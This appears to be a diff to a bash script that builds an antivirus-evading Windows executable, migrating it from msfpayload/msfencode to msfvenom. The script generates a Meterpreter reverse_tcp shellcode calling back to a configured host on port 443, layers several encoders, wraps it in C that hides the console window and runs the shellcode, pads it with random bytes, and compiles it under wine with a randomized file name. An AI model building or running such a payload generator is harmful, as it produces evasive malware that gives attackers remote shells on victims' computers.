@@ -1,13 +1,17 @@
 cd /usr/share/metasploit-framework/
-IP='00.0.000.00'
-port='4444'
+IP='1.1.1.1'
+port='443'
 enumber='3'
 seed='400'
-./msfpayload windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$port EXITFUNC=process R | ./msfencode -e x86/shikata_ga_nai -c $enumber -t raw | ./msfencode -e x86/jmp_call_additive -c $enumber -t raw | ./msfencode -e x86/call4_dword_xor -c $enumber -t raw |  ./msfencode -e x86/shikata_ga_nai -c $enumber  > test.c 
+./msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$port EXITFUNC=process -a x86 --platform windows -e x86/shikata_ga_nai -i $enumber -f raw | \
+./msfvenom -a x86 --platform windows -e x86/jmp_call_additive -i $enumber -f raw | \
+./msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i $enumber -f raw | \
+./msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i $enumber -f c -o test.c
+
 mv test.c ShellCode
 cd ShellCode
 sed -e 's/+/ /g' test.c > clean.c
-sed -e 's/buf = /unsigned char micro[]=/g' clean.c > ready.c
+sed -e 's/unsigned char buf\[\] =/unsigned char micro[]=/g' clean.c > ready.c
 echo "#include <stdio.h>" >> temp
 echo "#define _WIN32_WINNT 0x0500" >> temp
 echo "#include <windows.h>" >> temp
@@ -20,9 +24,13 @@ cat temp2 >> temp
 cat ready.c >> temp
 mv temp ready2.c
 echo ";" >> ready2.c
-echo "int main(void) { " >> ready2.c
-echo "HWND hWnd = GetConsoleWindow();" >> ready2.c
-echo "ShowWindow( hWnd, SW_HIDE );((void (*)())micro)();}" >> ready2.c  
+cat >>ready2.c<<EOL
+int main(void) {
+HWND hWnd = GetConsoleWindow();
+ShowWindow( hWnd, SW_HIDE );
+((void (*)())micro)();
+}
+EOL
 mv ready2.c final.c
 echo 'unsigned char tap[]=' > temp3
 for (( i=1; i<=999999;i++ )) do echo $RANDOM $i; done | sort -k1| cut -d " " -f2| head -$seed >> temp4
@@ -32,7 +40,7 @@ echo  ';' >> temp4
 cat temp4 >> temp3
 cat temp3 >> final.c  
 cd /root/.wine/drive_c/MinGW/bin/
-wine gcc.exe -o /root/out/final.exe /usr/share/metasploit-framework/ShellCode/final.c -lwsock32
+wine  gcc.exe -m32 -o /root/out/final.exe /usr/share/metasploit-framework/ShellCode/final.c -lwsock32
 cd /root/out/
 mv final.exe $RANDOM.exe
 filex=`ls -ct1 | head -1`
